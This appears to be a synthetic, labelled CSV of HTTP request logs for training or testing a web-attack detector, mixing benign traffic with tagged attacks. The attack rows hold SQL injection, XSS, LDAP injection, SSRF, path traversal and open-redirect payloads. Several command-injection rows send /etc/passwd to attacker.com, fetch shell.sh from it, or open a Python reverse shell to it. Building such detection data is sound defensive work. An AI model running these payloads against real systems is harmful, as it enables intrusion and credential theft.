timestamp,source_ip,dest_ip,method,host,path,query_string,full_url,user_agent,attack_type,is_attack
2026-04-07T14:06:48.861762,172.16.0.176,172.16.0.250,GET,admin.example.com,/faq,,https://admin.example.com/faq,curl/8.4.0,benign,0
2026-04-07T14:07:44.768352,10.0.0.87,172.16.0.141,HEAD,admin.example.com,/register,filter=recent&id=123,https://admin.example.com/register?filter=recent&id=123,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:03:43.546328,172.16.0.161,172.16.0.82,HEAD,shop.example.com,/register,,http://shop.example.com/register,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:40:50.155549,172.16.0.139,172.16.0.100,GET,shop.example.com,/lookup,ip=test; ls -la,http://shop.example.com/lookup?ip=test; ls -la,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,command_injection,1
2026-04-07T14:08:52.710153,172.16.0.188,10.0.0.26,GET,10.0.0.50,/goto,redirect=%2F%5Cevil.com,http://10.0.0.50/goto?redirect=%2F%5Cevil.com,gobuster/3.6,open_redirect,1
2026-04-07T13:47:42.503464,10.0.0.53,192.168.1.192,GET,192.168.1.100,/profile,search=<svg/onload=alert('XSS')>,http://192.168.1.100/profile?search=<svg/onload=alert('XSS')>,nuclei,xss,1
2026-04-07T14:45:07.991630,172.16.0.31,172.16.0.80,GET,10.0.0.50,/search,comment=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,http://10.0.0.50/search?comment=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,curl/8.4.0,xss,1
2026-04-07T15:01:43.882548,10.0.0.181,172.16.0.235,GET,webapp.internal,/profile,q=<body onload=alert('XSS')>,https://webapp.internal/profile?q=<body onload=alert('XSS')>,gobuster/3.6,xss,1
2026-04-07T13:51:24.763688,192.168.1.105,10.0.0.175,GET,example.com,/directory,user=admin%2A,http://example.com/directory?user=admin%2A,burpsuite,ldap_injection,1
2026-04-07T14:42:57.360569,10.0.0.207,10.0.0.245,POST,webapp.internal,/contact,id=123,http://webapp.internal/contact?id=123,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:30:45.045624,10.0.0.49,192.168.1.132,GET,secure.example.com,/search,id=1' AND 1=1--,https://secure.example.com/search?id=1' AND 1=1--,dirbuster,sql_injection,1
2026-04-07T14:09:22.080179,172.16.0.101,192.168.1.207,GET,192.168.1.100,/profile,query='-alert(1)-',http://192.168.1.100/profile?query='-alert(1)-',sqlmap/1.7.12#dev,xss,1
2026-04-07T13:31:18.102705,192.168.1.47,172.16.0.165,POST,webapp.internal,/api/message,"search=<video><source onerror=""alert(1)"">","https://webapp.internal/api/message?search=<video><source onerror=""alert(1)"">",sqlmap/1.7.12#dev,xss,1
2026-04-07T13:45:24.731050,172.16.0.35,10.0.0.181,GET,shop.example.com,/ldap,username=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A,http://shop.example.com/ldap?username=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",ldap_injection,1
2026-04-07T14:12:12.126277,192.168.1.156,192.168.1.22,POST,shop.example.com,/ping,host=test%7C%20type%20C%3A%5CWindows%5CSystem32%5Cconfig%5CSAM,https://shop.example.com/ping?host=test%7C%20type%20C%3A%5CWindows%5CSystem32%5Cconfig%5CSAM,python-requests/2.31.0,command_injection,1
2026-04-07T14:03:17.689476,10.0.0.221,10.0.0.119,GET,example.com,/api/user,uid=admin%29%28%7C%28password%3D%2A%29%29,https://example.com/api/user?uid=admin%29%28%7C%28password%3D%2A%29%29,PostmanRuntime/7.35.0,ldap_injection,1
2026-04-07T13:51:41.771284,192.168.1.51,192.168.1.250,GET,test-app.local,/blog/category/tech,category=electronics&q=laptop,http://test-app.local/blog/category/tech?category=electronics&q=laptop,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:47:57.506636,172.16.0.173,172.16.0.155,POST,webapp.internal,/search,q=1' AND 1=1--,http://webapp.internal/search?q=1' AND 1=1--,Nmap Scripting Engine,sql_injection,1
2026-04-07T13:41:48.206400,192.168.1.143,10.0.0.222,HEAD,10.0.0.50,/,to=2024-12-31&sort=asc,https://10.0.0.50/?to=2024-12-31&sort=asc,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:17:19.610016,10.0.0.121,10.0.0.59,POST,test-app.local,/products,,http://test-app.local/products,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:25:02.841142,172.16.0.109,172.16.0.122,HEAD,test-app.local,/checkout,id=123&brand=apple&format=json,http://test-app.local/checkout?id=123&brand=apple&format=json,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T14:32:35.382610,192.168.1.5,192.168.1.114,HEAD,admin.example.com,/news,order=name&id=123,http://admin.example.com/news?order=name&id=123,PostmanRuntime/7.35.0,benign,0
2026-04-07T14:40:39.310678,192.168.1.87,10.0.0.241,POST,secure.example.com,/ping,exec=test; ls -la,http://secure.example.com/ping?exec=test; ls -la,sqlmap/1.7.12#dev,command_injection,1
2026-04-07T13:58:57.087866,10.0.0.253,10.0.0.14,HEAD,secure.example.com,/images/logo.png,,http://secure.example.com/images/logo.png,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:08:52.272596,172.16.0.120,172.16.0.103,HEAD,192.168.1.100,/contact,id=123&status=active,https://192.168.1.100/contact?id=123&status=active,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:47:10.973016,172.16.0.123,192.168.1.228,GET,admin.example.com,/about,,http://admin.example.com/about,python-requests/2.31.0,benign,0
2026-04-07T13:56:23.788317,10.0.0.199,192.168.1.59,HEAD,example.com,/api/orders,,https://example.com/api/orders,python-requests/2.31.0,benign,0
2026-04-07T13:43:31.776156,10.0.0.187,172.16.0.235,POST,secure.example.com,/search,"order=' AND BENCHMARK(10000000,SHA1('test'))--","http://secure.example.com/search?order=' AND BENCHMARK(10000000,SHA1('test'))--",nuclei,sql_injection,1
2026-04-07T14:12:28.684658,10.0.0.160,10.0.0.203,GET,example.com,/api/products,,http://example.com/api/products,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:21:07.439189,10.0.0.42,10.0.0.11,POST,admin.example.com,/checkout,,http://admin.example.com/checkout,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:12:04.208501,172.16.0.20,172.16.0.74,POST,10.0.0.50,/blog/post/1,,https://10.0.0.50/blog/post/1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:21:47.752340,192.168.1.104,192.168.1.151,GET,example.com,/images/logo.png,type=product&filter=recent,https://example.com/images/logo.png?type=product&filter=recent,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:24:56.001550,192.168.1.51,192.168.1.162,GET,secure.example.com,/profile,id=123&category=electronics,https://secure.example.com/profile?id=123&category=electronics,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:16:18.540639,172.16.0.84,172.16.0.25,POST,example.com,/cart,page=1,http://example.com/cart?page=1,curl/8.4.0,benign,0
2026-04-07T13:36:56.607110,192.168.1.59,10.0.0.98,GET,secure.example.com,/load,target=http%3A%2F%2F0x7f000001%2F,http://secure.example.com/load?target=http%3A%2F%2F0x7f000001%2F,Nmap Scripting Engine,ssrf,1
2026-04-07T14:31:28.604135,10.0.0.62,10.0.0.232,GET,10.0.0.50,/terms,category=electronics,http://10.0.0.50/terms?category=electronics,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:43:04.294373,172.16.0.120,10.0.0.27,GET,10.0.0.50,/out,return=%2F%2Fevil.com,http://10.0.0.50/out?return=%2F%2Fevil.com,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",open_redirect,1
2026-04-07T13:30:31.665046,10.0.0.175,10.0.0.80,GET,admin.example.com,/comment,comment=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C%2Fa%3E,https://admin.example.com/comment?comment=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C%2Fa%3E,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",xss,1
2026-04-07T13:50:50.799891,172.16.0.198,10.0.0.236,GET,test-app.local,/login,,http://test-app.local/login,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:39:39.051423,10.0.0.53,10.0.0.44,POST,192.168.1.100,/exec,cmd=test%3B%20curl%20http%3A%2F%2Fattacker.com%2Fexfil%3Fdata%3D%24%28cat%20%2Fetc%2Fpasswd%29,https://192.168.1.100/exec?cmd=test%3B%20curl%20http%3A%2F%2Fattacker.com%2Fexfil%3Fdata%3D%24%28cat%20%2Fetc%2Fpasswd%29,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",command_injection,1
2026-04-07T14:02:28.995711,192.168.1.161,10.0.0.50,HEAD,10.0.0.50,/api/orders,id=123&filter=recent&view=list,https://10.0.0.50/api/orders?id=123&filter=recent&view=list,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:27:00.130826,192.168.1.85,192.168.1.154,GET,test-app.local,/settings,page=1,https://test-app.local/settings?page=1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:36:36.132657,192.168.1.163,10.0.0.137,GET,192.168.1.100,/profile,,http://192.168.1.100/profile,python-requests/2.31.0,benign,0
2026-04-07T14:15:15.822389,172.16.0.221,172.16.0.179,GET,test-app.local,/settings,view=list&category=electronics,http://test-app.local/settings?view=list&category=electronics,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T15:01:01.951725,192.168.1.82,10.0.0.175,GET,admin.example.com,/api/message,"query=<math><maction actiontype=""statusline#http://attacker.com"">","http://admin.example.com/api/message?query=<math><maction actiontype=""statusline#http://attacker.com"">","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",xss,1
2026-04-07T13:24:29.184022,10.0.0.65,10.0.0.155,GET,10.0.0.50,/api/v2/data,,http://10.0.0.50/api/v2/data,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:52:32.947797,192.168.1.156,10.0.0.78,HEAD,admin.example.com,/settings,,http://admin.example.com/settings,curl/8.4.0,benign,0
2026-04-07T13:33:18.259320,10.0.0.38,172.16.0.179,GET,api.example.com,/images/logo.png,page=1&brand=apple&category=electronics,https://api.example.com/images/logo.png?page=1&brand=apple&category=electronics,curl/8.4.0,benign,0
2026-04-07T14:31:27.541597,172.16.0.226,172.16.0.134,POST,192.168.1.100,/images/logo.png,format=json,http://192.168.1.100/images/logo.png?format=json,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:00:00.772087,10.0.0.166,10.0.0.140,GET,192.168.1.100,/fetch,url=http%3A%2F%2Fmetadata.google.internal%2F,http://192.168.1.100/fetch?url=http%3A%2F%2Fmetadata.google.internal%2F,ZAP/2.14.0,ssrf,1
2026-04-07T14:55:36.753268,10.0.0.84,172.16.0.40,GET,secure.example.com,/events,,http://secure.example.com/events,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:24:05.690879,10.0.0.230,172.16.0.92,GET,shop.example.com,/feedback,comment=%3Cmath%3E%3Cmaction%20actiontype%3D%22statusline%23http%3A%2F%2Fattacker.com%22%3E,https://shop.example.com/feedback?comment=%3Cmath%3E%3Cmaction%20actiontype%3D%22statusline%23http%3A%2F%2Fattacker.com%22%3E,wfuzz/3.1.0,xss,1
2026-04-07T14:56:54.909205,10.0.0.191,192.168.1.46,POST,shop.example.com,/settings,brand=apple,https://shop.example.com/settings?brand=apple,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:48:41.076667,10.0.0.67,192.168.1.3,POST,admin.example.com,/products,username=admin'--,http://admin.example.com/products?username=admin'--,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),sql_injection,1
2026-04-07T14:26:11.562497,10.0.0.105,10.0.0.53,GET,admin.example.com,/api/message,query=%3Cvideo%3E%3Csource%20onerror%3D%22alert%281%29%22%3E,http://admin.example.com/api/message?query=%3Cvideo%3E%3Csource%20onerror%3D%22alert%281%29%22%3E,PostmanRuntime/7.35.0,xss,1
2026-04-07T13:50:56.666344,10.0.0.181,10.0.0.129,POST,admin.example.com,/api/message,comment=<input onfocus=alert(1) autofocus>,http://admin.example.com/api/message?comment=<input onfocus=alert(1) autofocus>,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,xss,1
2026-04-07T13:49:35.765258,192.168.1.126,172.16.0.43,POST,shop.example.com,/ping,exec=test%3B%20ls%20-la,http://shop.example.com/ping?exec=test%3B%20ls%20-la,python-requests/2.31.0,command_injection,1
2026-04-07T13:42:29.548104,192.168.1.138,192.168.1.41,POST,webapp.internal,/ping,ip=test%7C%20rev%20%2Fetc%2Fpasswd,http://webapp.internal/ping?ip=test%7C%20rev%20%2Fetc%2Fpasswd,nuclei,command_injection,1
2026-04-07T14:15:47.688631,172.16.0.162,10.0.0.96,GET,secure.example.com,/cart,,https://secure.example.com/cart,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:03:32.274720,10.0.0.39,172.16.0.1,GET,10.0.0.50,/contact,user=john&format=json,http://10.0.0.50/contact?user=john&format=json,curl/8.4.0,benign,0
2026-04-07T14:35:15.622541,172.16.0.138,10.0.0.246,GET,example.com,/api/fetch,uri=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,http://example.com/api/fetch?uri=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,wfuzz/3.1.0,ssrf,1
2026-04-07T14:13:51.662061,192.168.1.155,172.16.0.107,GET,example.com,/index.html,id=123,http://example.com/index.html?id=123,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T14:45:31.621880,192.168.1.163,172.16.0.181,HEAD,shop.example.com,/profile,view=list&category=electronics,https://shop.example.com/profile?view=list&category=electronics,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T14:02:19.775751,192.168.1.115,10.0.0.28,GET,example.com,/products,"id=' UNION SELECT username, password FROM users--","https://example.com/products?id=' UNION SELECT username, password FROM users--",PostmanRuntime/7.35.0,sql_injection,1
2026-04-07T14:42:37.867884,172.16.0.96,172.16.0.135,GET,example.com,/api/execute,exec=test%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22attacker.com%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%27,http://example.com/api/execute?exec=test%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22attacker.com%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%27,nikto/2.5.0,command_injection,1
2026-04-07T13:37:46.246585,10.0.0.53,192.168.1.77,POST,test-app.local,/login,q=1' AND (SELECT COUNT(*) FROM users)>0--,http://test-app.local/login?q=1' AND (SELECT COUNT(*) FROM users)>0--,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",sql_injection,1
2026-04-07T13:30:20.635587,172.16.0.187,10.0.0.116,HEAD,api.example.com,/help,,http://api.example.com/help,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:35:20.009002,172.16.0.223,10.0.0.134,POST,admin.example.com,/checkout,,http://admin.example.com/checkout,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:34:26.892252,10.0.0.97,192.168.1.59,HEAD,shop.example.com,/logout,view=list&page=1&id=123,http://shop.example.com/logout?view=list&page=1&id=123,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:44:02.160069,10.0.0.183,10.0.0.32,GET,webapp.internal,/index.html,filter=recent,https://webapp.internal/index.html?filter=recent,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:50:50.639037,192.168.1.149,10.0.0.223,GET,secure.example.com,/search,"username=' AND BENCHMARK(10000000,SHA1('test'))--","http://secure.example.com/search?username=' AND BENCHMARK(10000000,SHA1('test'))--",masscan/1.3,sql_injection,1
2026-04-07T13:30:45.633081,10.0.0.95,10.0.0.161,GET,shop.example.com,/api/fetch,dest=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,http://shop.example.com/api/fetch?dest=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,ZAP/2.14.0,ssrf,1
2026-04-07T13:35:42.556843,10.0.0.171,192.168.1.253,GET,example.com,/download/..;/..;/..;/etc/passwd,,http://example.com/download/..;/..;/..;/etc/passwd,burpsuite,path_traversal,1
2026-04-07T14:56:05.549388,10.0.0.74,10.0.0.188,GET,shop.example.com,/search,q=' OR ''=',http://shop.example.com/search?q=' OR ''=',nuclei,sql_injection,1
2026-04-07T14:35:10.798738,172.16.0.72,10.0.0.122,POST,10.0.0.50,/notifications,category=electronics&type=product&to=2024-12-31,https://10.0.0.50/notifications?category=electronics&type=product&to=2024-12-31,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:51:04.074137,10.0.0.20,192.168.1.152,GET,secure.example.com,/cart,limit=10&sort=asc&filter=recent,https://secure.example.com/cart?limit=10&sort=asc&filter=recent,PostmanRuntime/7.35.0,benign,0
2026-04-07T14:57:45.228613,10.0.0.39,172.16.0.206,GET,test-app.local,/checkout,,http://test-app.local/checkout,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:40:44.993343,172.16.0.252,192.168.1.10,GET,example.com,/download/..0x2f..0x2f..0x2fetc/passwd,,http://example.com/download/..0x2f..0x2f..0x2fetc/passwd,python-requests/2.31.0,path_traversal,1
2026-04-07T14:00:54.901834,192.168.1.78,172.16.0.6,GET,192.168.1.100,/lookup,run=test$(cat /etc/passwd),http://192.168.1.100/lookup?run=test$(cat /etc/passwd),wfuzz/3.1.0,command_injection,1
2026-04-07T14:59:09.122131,192.168.1.202,192.168.1.147,GET,10.0.0.50,/api/v1/health,brand=apple&filter=recent&user=john,http://10.0.0.50/api/v1/health?brand=apple&filter=recent&user=john,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:25:36.713534,192.168.1.187,192.168.1.189,GET,api.example.com,/api/execute,run=test&& wget http://attacker.com/shell.sh,http://api.example.com/api/execute?run=test&& wget http://attacker.com/shell.sh,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),command_injection,1
2026-04-07T14:10:00.116002,172.16.0.193,172.16.0.16,POST,secure.example.com,/profile,input=%3Cmarquee%20onstart%3Dalert%281%29%3E,http://secure.example.com/profile?input=%3Cmarquee%20onstart%3Dalert%281%29%3E,dirbuster,xss,1
2026-04-07T14:40:16.825702,192.168.1.224,172.16.0.58,GET,shop.example.com,/css/style.css,q=laptop&id=123,http://shop.example.com/css/style.css?q=laptop&id=123,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:32:21.502805,10.0.0.92,172.16.0.213,POST,shop.example.com,/api/message,"message=<div style=""background:url('javascript:alert(1)')"">","http://shop.example.com/api/message?message=<div style=""background:url('javascript:alert(1)')"">",gobuster/3.6,xss,1
2026-04-07T14:33:22.796746,172.16.0.157,10.0.0.69,POST,shop.example.com,/search,order=' GROUP BY columnname HAVING 1=1--,http://shop.example.com/search?order=' GROUP BY columnname HAVING 1=1--,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",sql_injection,1
2026-04-07T13:56:59.999585,192.168.1.210,172.16.0.221,GET,shop.example.com,/comment,name=%3Cimg%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,http://shop.example.com/comment?name=%3Cimg%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,gobuster/3.6,xss,1
2026-04-07T13:28:20.825013,10.0.0.111,10.0.0.183,GET,test-app.local,/faq,limit=10,http://test-app.local/faq?limit=10,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:24:47.045425,10.0.0.103,192.168.1.114,GET,example.com,/search,page=1,http://example.com/search?page=1,curl/8.4.0,benign,0
2026-04-07T13:44:13.997566,10.0.0.7,172.16.0.235,GET,10.0.0.50,/news,,https://10.0.0.50/news,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:49:38.426685,192.168.1.50,172.16.0.33,GET,admin.example.com,/,view=list,https://admin.example.com/?view=list,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:31:41.717251,10.0.0.241,10.0.0.184,POST,api.example.com,/api/message,"input=<div style=""background:url('javascript:alert(1)')"">","http://api.example.com/api/message?input=<div style=""background:url('javascript:alert(1)')"">","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",xss,1
2026-04-07T13:53:52.536798,10.0.0.135,10.0.0.73,GET,api.example.com,/events,,https://api.example.com/events,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:11:33.275511,172.16.0.5,10.0.0.161,HEAD,secure.example.com,/terms,,https://secure.example.com/terms,PostmanRuntime/7.35.0,benign,0
2026-04-07T14:00:40.557615,10.0.0.184,172.16.0.133,HEAD,shop.example.com,/dashboard,,http://shop.example.com/dashboard,python-requests/2.31.0,benign,0
2026-04-07T13:49:26.861784,172.16.0.233,172.16.0.121,GET,192.168.1.100,/dashboard,lang=en&q=laptop,http://192.168.1.100/dashboard?lang=en&q=laptop,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T15:00:03.083289,10.0.0.59,192.168.1.54,GET,10.0.0.50,/checkout,format=json&page=1&type=product,https://10.0.0.50/checkout?format=json&page=1&type=product,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:09:32.963126,172.16.0.99,172.16.0.142,HEAD,shop.example.com,/cart,,https://shop.example.com/cart,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T14:05:59.361644,172.16.0.168,172.16.0.173,POST,shop.example.com,/api/products,type=product&lang=en&q=laptop,http://shop.example.com/api/products?type=product&lang=en&q=laptop,curl/8.4.0,benign,0
2026-04-07T13:25:57.505384,192.168.1.185,192.168.1.49,POST,10.0.0.50,/,order=name&id=123&brand=apple,http://10.0.0.50/?order=name&id=123&brand=apple,python-requests/2.31.0,benign,0
2026-04-07T13:45:29.379322,10.0.0.195,172.16.0.174,POST,shop.example.com,/contact,,http://shop.example.com/contact,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:50:48.107038,172.16.0.147,172.16.0.202,GET,192.168.1.100,/api/v1/health,limit=10,http://192.168.1.100/api/v1/health?limit=10,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T14:36:53.606077,192.168.1.9,172.16.0.237,POST,example.com,/blog/category/tech,,http://example.com/blog/category/tech,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:40:00.763993,172.16.0.86,10.0.0.50,GET,secure.example.com,/redirect,goto=%2F%2Fevil.com,http://secure.example.com/redirect?goto=%2F%2Fevil.com,gobuster/3.6,open_redirect,1
